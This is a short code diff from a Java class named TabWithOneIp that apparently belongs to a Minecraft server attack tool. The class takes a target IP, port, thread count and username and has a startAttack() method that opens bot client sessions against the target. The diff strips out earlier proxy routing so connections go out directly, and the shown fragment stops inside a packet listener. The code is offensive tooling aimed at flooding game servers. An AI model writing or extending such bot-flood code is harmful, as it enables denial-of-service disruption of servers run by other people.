@@ -10,33 +10,23 @@ import org.spacehq.packetlib.Client;
 import org.spacehq.packetlib.event.session.*;
 import org.spacehq.packetlib.tcp.TcpSessionFactory;
 
-import java.net.InetSocketAddress;
-import java.net.Proxy;
-
-
 public class TabWithOneIp extends Util {
 
     private static String ip;
     private static int port;
     private static int thread;
     private static String username;
-    private static Proxy.Type type;
-    private static String pip;
-    private static int pport;
 
-    public TabWithOneIp(String ip, int port, int thread, String username, Proxy.Type type, String pip, int pport) {
+    public TabWithOneIp(String ip, int port, int thread, String username) {
         this.ip = ip;
         this.port = port;
         this.thread = thread;
         this.username = username;
-        this.type = type;
-        this.pip = pip;
-        this.pport = pport;
     }
 
     public void startAttack() {
         MinecraftProtocol protocol = new MinecraftProtocol(username);
-        Client mc = new Client(ip, port, protocol, new TcpSessionFactory(new Proxy(type, new InetSocketAddress(pip, pport))));
+        Client mc = new Client(ip, port, protocol, new TcpSessionFactory());
         mc.getSession().addListener(new SessionListener() {
             @Override
             public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
